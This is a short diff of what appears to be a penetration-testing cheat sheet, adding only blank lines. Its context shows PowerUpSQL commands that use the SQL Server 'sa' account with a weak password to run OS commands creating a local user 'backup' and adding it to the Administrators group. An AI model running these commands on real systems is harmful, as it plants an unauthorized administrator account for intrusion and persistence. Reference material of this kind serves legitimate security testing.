@@ -18,3 +18,5 @@ PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSE
 PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add'" -Verbose
 PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
 ```
+
+
